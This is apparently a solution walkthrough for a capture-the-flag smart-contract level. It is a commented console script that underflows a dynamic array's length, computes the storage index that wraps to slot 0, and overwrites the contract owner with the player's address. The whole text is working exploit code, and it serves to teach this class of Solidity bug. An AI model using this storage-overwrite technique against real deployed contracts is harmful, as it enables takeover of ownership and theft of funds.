/*
Tools needed for this level:
- Console
*/

// 1.- Call the make_contact() function to be able to pass the contacted modifer:
await contract.make_contact()

// 2.- Call the retract() function to cause an underflow (making code.length = 2^256 - 1),
// which gives power to modify all storage slots by changing the value at proper index
// of codex (step 6).
await contract.retract()

// 3.- Calculate position of start of codex array (1 is the slot corresponding to codex
// array's location in storage) with web3 hashing function.
// * Dynamically sized arrays are calculated by hashing its slot: keccak256(slot)
position = web3.utils.soliditySha3(1)

// 4.- Calculate index of slot[0] (where owner is stored) for overwriting it with our address:
slot0 = BigInt(2 ** 256) - BigInt(position)

// 5.- Format the content with our address. Since the parameter "_content" is of type bytes32,
// we need to pad the player's address (20 bytes) on left with zeros (12 bytes, or 24 digits):
content = "0x" + "0".repeat(24) + player.slice(2)

// 6.- Call the revise() function passing the paramenters calculated:
await contract.revise(slot0, content)

// 7.-Check if we are now owners of contract.
;(await contract.owner()) === player
